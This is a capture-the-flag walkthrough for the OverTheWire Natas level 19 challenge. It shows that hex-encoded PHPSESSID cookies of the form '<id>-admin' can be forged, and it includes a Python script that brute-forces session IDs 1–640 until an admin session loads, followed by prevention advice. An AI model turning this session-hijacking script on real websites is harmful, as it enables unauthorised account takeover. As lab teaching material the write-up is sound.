# Natas Level 19 → 20

## Objective

Retrieve the password for the next level by exploiting weak session management.

Unlike the previous level, session IDs are no longer plain numeric values. They are encoded before being stored in the `PHPSESSID` cookie.

The goal is to identify the encoding format, generate valid administrator session IDs, and retrieve the credentials for **natas20**.

---

## Enumeration

- Logged in with random credentials.
- Observed the hint that session IDs are no longer sequential.
- Inspected the `PHPSESSID` cookie.
- Decoded the cookie using CyberChef.
- Identified that the cookie is hexadecimal encoded.

---

# Session Cookie Analysis

Example cookie:

```text
3631352d61646d696e
```

Decodes to:

```text
615-admin
```

Format:

```text
<session_id>-<username>
```

The application hex-encodes this value before storing it as the session cookie.

---

# Vulnerability

## Encoding ≠ Encryption

Hexadecimal only changes representation.

```
615-admin
```

becomes

```
3631352d61646d696e
```

Anyone can decode it.

The underlying session identifier is still predictable.

---

# Exploitation Strategy

Generate:

```
1-admin
2-admin
...
640-admin
```

Convert each value to hexadecimal and send it as the `PHPSESSID` cookie.

Stop when the response contains:

```
You are an admin.
```

# Exploit Script

```python
import requests

URL = "http://natas19.natas.labs.overthewire.org"

USERNAME = "natas19"
PASSWORD = "<LEVEL18_PASSWORD>"

session = requests.Session()
session.auth = (USERNAME, PASSWORD)

for session_id in range(1, 641):

    raw = f"{session_id}-admin"
    cookie = raw.encode().hex()

    response = session.get(
        URL,
        cookies={"PHPSESSID": cookie},
        timeout=5
    )

    print(f"\r[*] Testing {session_id}/640", end="", flush=True)

    if "You are an admin" in response.text:

        print("\n\n[+] Admin Session Found!")
        print(f"[+] Session : {session_id}")
        print(f"[+] Cookie  : {cookie}")
        print(response.text)
        break
```

---

# Script Explanation

- `requests.Session()` reuses the HTTP connection.
- `f"{session_id}-admin"` creates the expected session format.
- `.encode().hex()` converts the string into hexadecimal.
- The encoded value is sent as the `PHPSESSID` cookie.
- The response is checked for `"You are an admin"`.

# Why This Script Works

The application stores administrator sessions in the following format:

```text
<session_id>-admin
```

before converting them into hexadecimal.

Since:

- Session IDs are predictable (1–640)
- Hexadecimal encoding is completely reversible
- The server trusts the client-supplied `PHPSESSID` cookie

an attacker can generate every possible administrator session, encode it into hexadecimal, and send it back to the server.

Once the correct encoded session is found, the server loads the administrator's session and grants administrative access without requiring the administrator's password.

---

# Prevention

- Use cryptographically random session IDs.
- Never rely on encoding as a security mechanism.
- Validate session ownership.
- Expire inactive sessions.
- Use secure cookie attributes.

---

# Key Takeaways

- Hex encoding is reversible.
- Encoding is not encryption.
- Predictable session IDs remain vulnerable.
- Weak session management can bypass authentication.
